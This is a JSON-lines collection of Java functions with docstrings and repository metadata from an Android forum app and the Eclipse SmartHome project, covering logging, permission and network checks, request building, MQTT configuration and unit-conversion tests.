{"docstring": "// \u5224\u65ad\u6743\u9650\u96c6\u5408\n", "func_signal": "public static boolean lacksPermissions(Context context, String... permissions)", "code": "{\n    mContext = (Activity) context;\n    closePermissions.clear();\n\n    for (String permission : permissions) {\n        if (!lacksPermission(permission)) {\n            closePermissions.add(permission);\n        }\n    }\n\n    System.out.println(\"========== \" + closePermissions.size() + \" ============\");\n    if (closePermissions.size() != 0) {\n        openPermission(closePermissions.toArray(new String[closePermissions.size()]));\n        return false;\n    } else {\n        return true;\n    }\n\n}", "path": "app\\src\\main\\java\\com\\jun\\elephant\\util\\PermissionsChecker.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send a WARNING log message\n *\n * @param tag\n * @param msg\n * @param throwable\n */\n", "func_signal": "public static void w(String tag, String msg, Throwable throwable)", "code": "{\n    if (sLevel > LEVEL_WARNING) {\n        return;\n    }\n    Log.w(tag, msg, throwable);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send an INFO log message\n *\n * @param tag\n * @param msg\n * @param args\n */\n", "func_signal": "public static void i(String tag, String msg, Object... args)", "code": "{\n    if (sLevel > LEVEL_INFO) {\n        return;\n    }\n    if (args.length > 0) {\n        msg = String.format(msg, args);\n    }\n    Log.i(tag, msg);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send an ERROR log message\n *\n * @param tag\n * @param msg\n * @param args\n */\n", "func_signal": "public static void e(String tag, String msg, Object... args)", "code": "{\n    if (sLevel > LEVEL_ERROR) {\n        return;\n    }\n    if (args.length > 0) {\n        msg = String.format(msg, args);\n    }\n    Log.e(tag, msg);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send a VERBOSE log message.\n *\n * @param tag\n * @param msg\n * @param throwable\n */\n", "func_signal": "public static void v(String tag, String msg, Throwable throwable)", "code": "{\n    if (sLevel > LEVEL_VERBOSE) {\n        return;\n    }\n    Log.v(tag, msg, throwable);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send a DEBUG log message\n *\n * @param tag\n * @param msg\n * @param args\n */\n", "func_signal": "public static void d(String tag, String msg, Object... args)", "code": "{\n    if (sLevel > LEVEL_DEBUG) {\n        return;\n    }\n    if (args.length > 0) {\n        msg = String.format(msg, args);\n    }\n    Log.d(tag, msg);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send a DEBUG log message\n *\n * @param tag\n * @param msg\n */\n", "func_signal": "public static void d(String tag, String msg)", "code": "{\n    if (sLevel > LEVEL_DEBUG) {\n        return;\n    }\n    Log.d(tag, msg);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * \u5224\u65adWIFI\u662f\u5426\u6253\u5f00\n * @param context\n * @return\n */\n", "func_signal": "public static boolean isWifiEnabled(Context context)", "code": "{\n    ConnectivityManager mgrConn = (ConnectivityManager) context\n            .getSystemService(Context.CONNECTIVITY_SERVICE);\n    TelephonyManager mgrTel = (TelephonyManager) context\n            .getSystemService(Context.TELEPHONY_SERVICE);\n    return ((mgrConn.getActiveNetworkInfo() != null && mgrConn\n            .getActiveNetworkInfo().getState() == NetworkInfo.State.CONNECTED) || mgrTel\n            .getNetworkType() == TelephonyManager.NETWORK_TYPE_UMTS);\n}", "path": "app\\src\\main\\java\\com\\jun\\elephant\\util\\NetworkUtils.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * \u83b7\u53d6\u767b\u5f55\u72b6\u6001 Token\uff0c\u626b\u63cf\u540e\u5f97\u5230\u7684 userName\uff0c loginToken\n * @param context\n * @param userName\n * @param loginToken\n * @return\n */\n", "func_signal": "@Override\npublic Observable<TokenEntity> getLoginToken(Context context, String userName, String loginToken)", "code": "{\n    return Networks.getInstance().getTokenApi().getToken(\n            Constants.Token.AUTH_TYPE_USER,\n            BuildConfig.CLIENT_ID,\n            BuildConfig.CLIENT_SECRET,\n            userName, loginToken);\n}", "path": "app\\src\\main\\java\\com\\jun\\elephant\\ui\\login\\LoginModel.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send a WARNING log message\n *\n * @param tag\n * @param msg\n * @param args\n */\n", "func_signal": "public static void w(String tag, String msg, Object... args)", "code": "{\n    if (sLevel > LEVEL_WARNING) {\n        return;\n    }\n    if (args.length > 0) {\n        msg = String.format(msg, args);\n    }\n    Log.w(tag, msg);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send a DEBUG log message\n *\n * @param tag\n * @param msg\n * @param throwable\n */\n", "func_signal": "public static void d(String tag, String msg, Throwable throwable)", "code": "{\n    if (sLevel > LEVEL_DEBUG) {\n        return;\n    }\n    Log.d(tag, msg, throwable);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send a VERBOSE log message.\n *\n * @param tag\n * @param msg\n */\n", "func_signal": "public static void v(String tag, String msg)", "code": "{\n    if (sLevel > LEVEL_VERBOSE) {\n        return;\n    }\n    Log.v(tag, msg);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send an ERROR log message\n *\n * @param tag\n * @param msg\n * @param throwable\n */\n", "func_signal": "public static void e(String tag, String msg, Throwable throwable)", "code": "{\n    if (sLevel > LEVEL_ERROR) {\n        return;\n    }\n    Log.e(tag, msg, throwable);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * \u5224\u65ad\u662fwifi\u8fd8\u662f3g\u7f51\u7edc\n * @param context\n * @return\n */\n", "func_signal": "public static boolean isWifi(Context context)", "code": "{\n    ConnectivityManager cm = (ConnectivityManager) context\n            .getSystemService(Context.CONNECTIVITY_SERVICE);\n    NetworkInfo networkINfo = cm.getActiveNetworkInfo();\n    if (networkINfo != null\n            && networkINfo.getType() == ConnectivityManager.TYPE_WIFI) {\n        return true;\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\jun\\elephant\\util\\NetworkUtils.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "//\u662f\u5426\u5141\u8bb8\u5f00\u542f\u6743\u9650\u56de\u8c03\n", "func_signal": "public static void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults)", "code": "{\n    if (requestCode == REQUEST_STORAGE_PERMISSION) {\n        if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {\n//                Toast.makeText(mContext,\"\u83b7\u53d6\u6743\u9650\u6210\u529f\",Toast.LENGTH_SHORT).show();\n        } else {\n//                Toast.makeText(mContext,\"\u83b7\u53d6\u6743\u9650\u5931\u8d25\",Toast.LENGTH_SHORT).show();\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\jun\\elephant\\util\\PermissionsChecker.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send a WARNING log message\n *\n * @param tag\n * @param msg\n */\n", "func_signal": "public static void w(String tag, String msg)", "code": "{\n    if (sLevel > LEVEL_WARNING) {\n        return;\n    }\n    Log.w(tag, msg);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send a FATAL ERROR log message\n *\n * @param tag\n * @param msg\n * @param args\n */\n", "func_signal": "public static void f(String tag, String msg, Object... args)", "code": "{\n    if (sLevel > LEVEL_FATAL) {\n        return;\n    }\n    if (args.length > 0) {\n        msg = String.format(msg, args);\n    }\n    Log.wtf(tag, msg);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Returns the zodiac for the specified calendar.\n */\n", "func_signal": "public SunZodiac getZodiac(Calendar calendar)", "code": "{\n    int year = calendar.get(Calendar.YEAR);\n    List<SunZodiac> zodiacs = zodiacsByYear.get(year);\n    if (zodiacs == null) {\n        zodiacs = calculateZodiacs(year);\n        zodiacsByYear.clear();\n        zodiacsByYear.put(year, zodiacs);\n    }\n\n    for (SunZodiac zodiac : zodiacs) {\n        if (zodiac.isValid(calendar)) {\n            return zodiac;\n        }\n    }\n\n    return null;\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.astro\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\astro\\internal\\calc\\SunZodiacCalc.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Convert an {@link Object} to a {@link String} or null, if the obj was null or it was a negative {@link Number}.\n *\n * @param obj can be null\n * @return the {@link String} or null\n */\n", "func_signal": "public static String objectToString(Object obj)", "code": "{\n    if (obj == null) {\n        return null;\n    }\n    if (obj instanceof DSID) {\n        return ((DSID) obj).getValue();\n    }\n    if (obj instanceof Number) {\n        return ((Number) obj).intValue() > -1 ? obj.toString() : null;\n    }\n    return obj.toString();\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.digitalstrom\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\digitalstrom\\internal\\lib\\serverconnection\\simpledsrequestbuilder\\SimpleRequestBuilder.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Adds a parameter for group-requests t the request-string, if the parameter value is not null.\n *\n * @param sessionToken\n * @param groupID\n * @param groupName\n * @return SimpleRequestBuilder with added parameter\n * @throws IllegalArgumentException if no class and function added\n * @throws NullArgumentException if the parameterKey is null\n */\n", "func_signal": "public SimpleRequestBuilder addDefaultGroupParameter(String sessionToken, Short groupID, String groupName)\n        throws IllegalArgumentException, NullArgumentException", "code": "{\n    return addParameter(ParameterKeys.TOKEN, sessionToken)\n            .addParameter(ParameterKeys.GROUP_ID, objectToString(groupID))\n            .addParameter(ParameterKeys.GROUP_NAME, groupName);\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.digitalstrom\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\digitalstrom\\internal\\lib\\serverconnection\\simpledsrequestbuilder\\SimpleRequestBuilder.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "// Utility method that could be used for non-secure and secure port.\n", "func_signal": "private static int getHttpServicePortProperty(final BundleContext bc, final String propertyName)", "code": "{\n    Object value;\n    int port = -1;\n\n    // Try to find the port by using the service property (respect service ranking).\n    final ServiceReference<?>[] refs;\n    try {\n        refs = bc.getAllServiceReferences(\"org.osgi.service.http.HttpService\", null);\n    } catch (final InvalidSyntaxException ex) {\n        // This point of code should never be reached.\n        final Logger logger = LoggerFactory.getLogger(HttpServiceUtil.class);\n        logger.warn(\"This error should only be thrown if a filter could not be parsed. We don't use a filter...\");\n        return -1;\n    }\n\n    if (refs != null) {\n        int candidate = Integer.MIN_VALUE;\n        for (final ServiceReference<?> ref : refs) {\n            value = ref.getProperty(propertyName);\n            if (value == null) {\n                continue;\n            }\n            final int servicePort;\n            try {\n                servicePort = Integer.parseInt(value.toString());\n            } catch (final NumberFormatException ex) {\n                continue;\n            }\n            value = ref.getProperty(Constants.SERVICE_RANKING);\n            final int serviceRanking;\n            if (value == null || !(value instanceof Integer)) {\n                serviceRanking = 0;\n            } else {\n                serviceRanking = (Integer) value;\n            }\n            if (serviceRanking >= candidate) {\n                candidate = serviceRanking;\n                port = servicePort;\n            }\n        }\n    }\n    if (port > 0) {\n        return port;\n    }\n\n    // If the service does not provide the port, try to use the system property.\n    value = bc.getProperty(propertyName);\n    if (value != null) {\n        if (value instanceof String) {\n            try {\n                return Integer.parseInt(value.toString());\n            } catch (final NumberFormatException ex) {\n                // If the property could not be parsed, the HTTP servlet itself has to care and warn about.\n            }\n        } else if (value instanceof Integer) {\n            return (Integer) value;\n        }\n    }\n\n    return -1;\n}", "path": "bundles\\core\\org.eclipse.smarthome.core\\src\\main\\java\\org\\eclipse\\smarthome\\core\\net\\HttpServiceUtil.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Returns a {@link SimpleRequestBuilder} with the given intefaceKey as chosen request-interface.\n *\n * @param interfaceKey must not be null\n * @return simpleRequestBuilder with chosen interface\n * @throws NullArgumentException if the interfaceKey is null\n */\n", "func_signal": "public static SimpleRequestBuilder buildNewRequest(String interfaceKey) throws NullArgumentException", "code": "{\n    if (builder == null) {\n        builder = new SimpleRequestBuilder();\n    }\n    LOCK.lock();\n    return builder.buildNewRequestInt(interfaceKey);\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.digitalstrom\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\digitalstrom\\internal\\lib\\serverconnection\\simpledsrequestbuilder\\SimpleRequestBuilder.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Create broker connections based on the service configuration. This will disconnect and\n * discard all existing textual configured brokers.\n */\n", "func_signal": "@Modified\npublic void modified(@Nullable Map<String, Object> configMap)", "code": "{\n    if (connection != null) {\n        connection.stop();\n    }\n\n    if (configMap == null || configMap.isEmpty() || mqttService == null) {\n        return;\n    }\n    final @NonNull MqttServiceImpl service = (@NonNull MqttServiceImpl) mqttService;\n\n    // Parse configuration\n    MqttBrokerConnectionConfig config = new Configuration(configMap).as(MqttBrokerConnectionConfig.class);\n\n    try {\n        // Compute brokerID and make sure it is not empty\n        String brokerID = config.getBrokerID();\n        if (StringUtils.isBlank(brokerID) || brokerID == null) {\n            logger.warn(\"Ignore invalid broker connection configuration: {}\", config);\n            return;\n        }\n\n        // Add connection and make sure it succeeded\n        MqttBrokerConnection c = service.addBrokerConnection(brokerID, config);\n        connection = c;\n        if (c == null) {\n            logger.warn(\"Ignore existing broker connection configuration for: {}\", brokerID);\n            return;\n        }\n        c.start(); // Start connection\n    } catch (ConfigurationException | IllegalArgumentException e) {\n        logger.warn(\"MqttBroker connection configuration faulty: {}\", e.getMessage());\n    } catch (MqttException e) {\n        logger.warn(\"MqttBroker start failed: {}\", e.getMessage(), e);\n    }\n}", "path": "bundles\\io\\org.eclipse.smarthome.io.transport.mqtt\\src\\main\\java\\org\\eclipse\\smarthome\\io\\transport\\mqtt\\internal\\MqttBrokerConnectionServiceInstance.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Auxiliary method for sorting lexicographically the strings at the positions x, y and z.\n *\n * @param a represents the array with the strings for sorting.\n * @param x position of the first string.\n * @param y position of the second string.\n * @param z position of the third string.\n */\n", "func_signal": "private static void sort3(String[] a, int x, int y, int z)", "code": "{\n    if (a[x].compareTo(a[y]) > 0) {\n        if (a[x].compareTo(a[z]) > 0) {\n            if (a[y].compareTo(a[z]) > 0) {\n                swap(a, x, z);\n            } else {\n                swap3(a, x, y, z);\n            }\n        } else {\n            swap(a, x, y);\n        }\n    } else if (a[x].compareTo(a[z]) > 0) {\n        swap3(a, x, z, y);\n    } else if (a[y].compareTo(a[z]) > 0) {\n        swap(a, y, z);\n    }\n}", "path": "bundles\\automation\\org.eclipse.smarthome.automation.commands\\src\\main\\java\\org\\eclipse\\smarthome\\automation\\internal\\commands\\Utils.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "//github.com/eclipse/smarthome/issues/6015\")\n", "func_signal": "@Test\n    public void assertMuteChannelMutesOutput()", "code": "{\n        bridgeHandler.handleCommand(CHANNEL_UID_MUTE, OnOffType.ON);\n        Mockito.verify(bridgeHandler, after(500).atMost(1)).sendDmxData();\n\n        bridgeHandler.handleCommand(CHANNEL_UID_MUTE, OnOffType.OFF);\n        Mockito.verify(bridgeHandler, after(500).atLeast(9)).sendDmxData();\n    }", "path": "extensions\\binding\\org.eclipse.smarthome.binding.dmx.test\\src\\test\\java\\org\\eclipse\\smarthome\\binding\\dmx\\DmxBridgeHandlerTest.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Auxiliary method for sorting lexicographically the strings. Shuffling strings on positions x and y, as the string\n * at the position x, goes to the position y, the string at the position y, goes to the position x.\n *\n * @param a represents the array with the strings for sorting.\n * @param x position of the first string.\n * @param y position of the second string.\n */\n", "func_signal": "private static void swap(String[] a, int x, int y)", "code": "{\n    String t = a[x];\n    a[x] = a[y];\n    a[y] = t;\n}", "path": "bundles\\automation\\org.eclipse.smarthome.automation.commands\\src\\main\\java\\org\\eclipse\\smarthome\\automation\\internal\\commands\\Utils.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * An additional test which converts given test quantity into base unit and then compares it with expected value.\n *\n * This basic test confirms that values of different flow rates can be exchanged to given base unit.\n */\n", "func_signal": "@Test\npublic void testValueConversionToM3s()", "code": "{\n    ComparableQuantity<VolumetricFlowRate> quantity = Quantities.getQuantity(value, unit);\n    ComparableQuantity<VolumetricFlowRate> quantityInBase = Quantities.getQuantity(valueInBaseUnit, BASE_UNIT);\n\n    ComparableQuantity<VolumetricFlowRate> convertedQuantity = quantity.to(BASE_UNIT);\n\n    assertThat(convertedQuantity, is(equalTo(quantityInBase)));\n}", "path": "bundles\\core\\org.eclipse.smarthome.core.test\\src\\test\\java\\org\\eclipse\\smarthome\\core\\types\\VolumetricFlowRateTest.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Auxiliary method for sorting lexicographically the strings. Shuffling strings on positions x, y and z, as the\n * string\n * at the position x, goes to the position z, the string at the position y, goes to the position x and the string\n * at the position z, goes to the position y.\n *\n * @param a represents the array with the strings for sorting.\n * @param x position of the first string.\n * @param y position of the second string.\n * @param z position of the third string.\n */\n", "func_signal": "private static void swap3(String[] a, int x, int y, int z)", "code": "{\n    String t = a[x];\n    a[x] = a[y];\n    a[y] = a[z];\n    a[z] = t;\n}", "path": "bundles\\automation\\org.eclipse.smarthome.automation.commands\\src\\main\\java\\org\\eclipse\\smarthome\\automation\\internal\\commands\\Utils.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Returns the request string.\n *\n * @return request string\n * @throws IllegalArgumentException if no class or function is added.\n */\n", "func_signal": "public String buildRequestString() throws IllegalArgumentException", "code": "{\n    String request = builder.buildRequestStringInt();\n    LOCK.unlock();\n    return request;\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.digitalstrom\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\digitalstrom\\internal\\lib\\serverconnection\\simpledsrequestbuilder\\SimpleRequestBuilder.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Adds the default parameter for zone-requests to the request-string, if the parameter value is not null.\n *\n * @param sessionToken\n * @param zoneID\n * @param zoneName\n * @return SimpleRequestBuilder with added parameter\n * @throws IllegalArgumentException if no class and function added\n * @throws NullArgumentException if the parameterKey is null\n */\n", "func_signal": "public SimpleRequestBuilder addDefaultZoneParameter(String sessionToken, Integer zoneID, String zoneName)\n        throws IllegalArgumentException, NullArgumentException", "code": "{\n    return addParameter(ParameterKeys.TOKEN, sessionToken).addParameter(ParameterKeys.ID, objectToString(zoneID))\n            .addParameter(ParameterKeys.NAME, zoneName);\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.digitalstrom\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\digitalstrom\\internal\\lib\\serverconnection\\simpledsrequestbuilder\\SimpleRequestBuilder.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Adds a parameter for device-requests the request-string, if the parameter value is not null.\n *\n * @param sessionToken\n * @param dsid\n * @param dSUID\n * @param name\n * @return SimpleRequestBuilder with added parameter\n * @throws IllegalArgumentException if no class and function added\n * @throws NullArgumentException if the parameterKey is null\n */\n", "func_signal": "public SimpleRequestBuilder addDefaultDeviceParameter(String sessionToken, DSID dsid, String dSUID, String name)\n        throws IllegalArgumentException, NullArgumentException", "code": "{\n    return addParameter(ParameterKeys.TOKEN, sessionToken).addParameter(ParameterKeys.DSID, objectToString(dsid))\n            .addParameter(ParameterKeys.DSUID, dSUID).addParameter(ParameterKeys.NAME, name);\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.digitalstrom\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\digitalstrom\\internal\\lib\\serverconnection\\simpledsrequestbuilder\\SimpleRequestBuilder.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Returns the configured zoneID of the given {@link Configuration}. If the zoneID does't exist or can't be checked\n * {@link #ZONE_ID_NOT_EXISTS}, {@link #ZONE_ID_NOT_SET} or {@link #BRIDGE_IS_NULL} will be returned.\n *\n * @param config the {@link Configuration} to be checked\n * @param bridge the responsible {@link BridgeHandler}\n * @return zoneID the existing dS zoneID or a error constant\n */\n", "func_signal": "public static int getZoneID(Configuration config, BridgeHandler bridge)", "code": "{\n    if (config == null || config.get(DigitalSTROMBindingConstants.ZONE_ID) == null) {\n        return ZONE_ID_NOT_SET;\n    }\n    if (bridge == null) {\n        return BRIDGE_IS_NULL;\n    }\n    String configZoneID = config.get(DigitalSTROMBindingConstants.ZONE_ID).toString();\n    int zoneID;\n    StructureManager strucMan = bridge.getStructureManager();\n    if (strucMan != null) {\n        try {\n            zoneID = Integer.parseInt(configZoneID);\n            if (!strucMan.checkZoneID(zoneID)) {\n                zoneID = ZONE_ID_NOT_EXISTS;\n            }\n        } catch (NumberFormatException e) {\n            zoneID = strucMan.getZoneId(configZoneID);\n        }\n        return zoneID;\n    }\n    return ZONE_ID_NOT_EXISTS;\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.digitalstrom\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\digitalstrom\\handler\\ZoneTemperatureControlHandler.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Creates a new config status source object.\n *\n * @param entityId the id of the entity whose new configuration status is to be propagated\n */\n", "func_signal": "public ConfigStatusSource(@NonNull String entityId)", "code": "{\n    super();\n    this.entityId = entityId;\n}", "path": "bundles\\config\\org.eclipse.smarthome.config.core\\src\\main\\java\\org\\eclipse\\smarthome\\config\\core\\status\\ConfigStatusSource.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Calculates the zodiacs for the current year.\n */\n", "func_signal": "private List<SunZodiac> calculateZodiacs(int year)", "code": "{\n    List<SunZodiac> zodiacs = new ArrayList<SunZodiac>();\n\n    zodiacs.add(new SunZodiac(ZodiacSign.ARIES,\n            DateTimeUtils.getRange(year, Calendar.MARCH, 21, year, Calendar.APRIL, 19)));\n    zodiacs.add(new SunZodiac(ZodiacSign.TAURUS,\n            DateTimeUtils.getRange(year, Calendar.APRIL, 20, year, Calendar.MAY, 20)));\n    zodiacs.add(new SunZodiac(ZodiacSign.GEMINI,\n            DateTimeUtils.getRange(year, Calendar.MAY, 21, year, Calendar.JUNE, 20)));\n    zodiacs.add(new SunZodiac(ZodiacSign.CANCER,\n            DateTimeUtils.getRange(year, Calendar.JUNE, 21, year, Calendar.JULY, 22)));\n    zodiacs.add(new SunZodiac(ZodiacSign.LEO,\n            DateTimeUtils.getRange(year, Calendar.JULY, 23, year, Calendar.AUGUST, 22)));\n    zodiacs.add(new SunZodiac(ZodiacSign.VIRGO,\n            DateTimeUtils.getRange(year, Calendar.AUGUST, 23, year, Calendar.SEPTEMBER, 22)));\n    zodiacs.add(new SunZodiac(ZodiacSign.LIBRA,\n            DateTimeUtils.getRange(year, Calendar.SEPTEMBER, 23, year, Calendar.OCTOBER, 22)));\n    zodiacs.add(new SunZodiac(ZodiacSign.SCORPIO,\n            DateTimeUtils.getRange(year, Calendar.OCTOBER, 23, year, Calendar.NOVEMBER, 21)));\n    zodiacs.add(new SunZodiac(ZodiacSign.SAGITTARIUS,\n            DateTimeUtils.getRange(year, Calendar.NOVEMBER, 22, year, Calendar.DECEMBER, 21)));\n    zodiacs.add(new SunZodiac(ZodiacSign.CAPRICORN,\n            DateTimeUtils.getRange(year, Calendar.DECEMBER, 22, year + 1, Calendar.JANUARY, 19)));\n    zodiacs.add(new SunZodiac(ZodiacSign.CAPRICORN,\n            DateTimeUtils.getRange(year - 1, Calendar.DECEMBER, 22, year, Calendar.JANUARY, 19)));\n    zodiacs.add(new SunZodiac(ZodiacSign.AQUARIUS,\n            DateTimeUtils.getRange(year, Calendar.JANUARY, 20, year, Calendar.FEBRUARY, 18)));\n    zodiacs.add(new SunZodiac(ZodiacSign.PISCES,\n            DateTimeUtils.getRange(year, Calendar.FEBRUARY, 19, year, Calendar.MARCH, 20)));\n\n    return zodiacs;\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.astro\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\astro\\internal\\calc\\SunZodiacCalc.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Adds a parameter for zone-group-requests t the request-string, if the parameter value is not null.\n *\n * @param sessionToken\n * @param zoneID\n * @param zoneName\n * @param groupID\n * @param groupName\n * @return SimpleRequestBuilder with added parameter\n * @throws IllegalArgumentException if no class and function added\n * @throws NullArgumentException if the parameterKey is null\n */\n", "func_signal": "public SimpleRequestBuilder addDefaultZoneGroupParameter(String sessionToken, Integer zoneID, String zoneName,\n        Short groupID, String groupName) throws IllegalArgumentException, NullArgumentException", "code": "{\n    return addDefaultZoneParameter(sessionToken, zoneID, zoneName)\n            .addParameter(ParameterKeys.GROUP_ID, objectToString(groupID))\n            .addParameter(ParameterKeys.GROUP_NAME, groupName);\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.digitalstrom\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\digitalstrom\\internal\\lib\\serverconnection\\simpledsrequestbuilder\\SimpleRequestBuilder.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Verifies that given symbol is recognized by {@link UnitUtils}.\n */\n", "func_signal": "@Test\npublic void testSymbolLookup()", "code": "{\n    Unit<?> parsedUnit = UnitUtils.parseUnit(symbol);\n\n    assertThat(parsedUnit, is(notNullValue()));\n    assertThat(parsedUnit, is(equalTo(unit)));\n}", "path": "bundles\\core\\org.eclipse.smarthome.core.test\\src\\test\\java\\org\\eclipse\\smarthome\\core\\types\\VolumetricFlowRateTest.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
{"docstring": "/**\n * Response constructor\n */\n", "func_signal": "public BlueGigaReadLongResponse(int[] inputBuffer)", "code": "{\n    // Super creates deserializer and reads header fields\n    super(inputBuffer);\n\n    event = (inputBuffer[0] & 0x80) != 0;\n\n    // Deserialize the fields\n    connection = deserializeUInt8();\n    result = deserializeBgApiResponse();\n}", "path": "extensions\\binding\\org.eclipse.smarthome.binding.bluetooth.bluegiga\\src\\main\\java\\org\\eclipse\\smarthome\\binding\\bluetooth\\bluegiga\\internal\\command\\attributeclient\\BlueGigaReadLongResponse.java", "repo_name": "eclipse-archived/smarthome", "stars": 861, "license": "epl-2.0", "language": "java", "size": 67215}
